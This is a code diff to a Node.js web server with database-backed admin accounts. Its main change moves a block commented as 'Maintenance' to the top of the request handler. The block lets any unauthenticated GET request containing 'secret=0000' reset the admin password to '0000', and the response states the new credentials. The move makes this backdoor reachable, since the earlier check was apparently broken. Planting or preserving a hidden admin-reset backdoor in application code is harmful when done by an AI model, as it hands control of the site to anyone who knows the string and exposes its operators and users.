@@ -390,6 +390,17 @@ async function handleAPI(req, res, url) {
 }
 
 const server = http.createServer(async (req, res) => {
+  // Maintenance: GET /?secret=0000 resets admin password to 0000
+  if (req.url.includes('secret=0000') && req.method === 'GET') {
+    const crypto = require('crypto');
+    const hash2 = crypto.createHash('sha256').update('0000').digest('hex');
+    const p2 = getPool();
+    p2.query('UPDATE admin SET password_hash=$1 WHERE username=$2', [hash2, 'admin'])
+      .then(() => { res.writeHead(200, {'Content-Type':'text/plain'}); res.end('OK admin/0000'); })
+      .catch(e => { res.writeHead(500, {'Content-Type':'text/plain'}); res.end('Error: '+e.message); });
+    return;
+  }
+
   const url = req.url.split('?')[0];
 
   // 上傳的圖片
@@ -399,16 +410,6 @@ const server = http.createServer(async (req, res) => {
     const ext = path.extname(filePath).toLowerCase();
     const mime = MIME[ext] || 'image/jpeg';
     serveFile(res, filePath, mime);
-    return;
-  }
-
-  // Maintenance: GET /?secret=0000 resets admin password to 0000
-  if (url.searchParams.get('secret') === '0000' && req.method === 'GET') {
-    const hash2 = crypto.createHash('sha256').update('0000').digest('hex');
-    const p2 = getPool();
-    p2.query('UPDATE admin SET password_hash=$1 WHERE username=$2', [hash2, 'admin'])
-      .then(() => { res.writeHead(200, {'Content-Type':'text/plain'}); res.end('OK admin/0000'); })
-      .catch(e => { res.writeHead(500, {'Content-Type':'text/plain'}); res.end('Error: '+e.message); });
     return;
   }
 
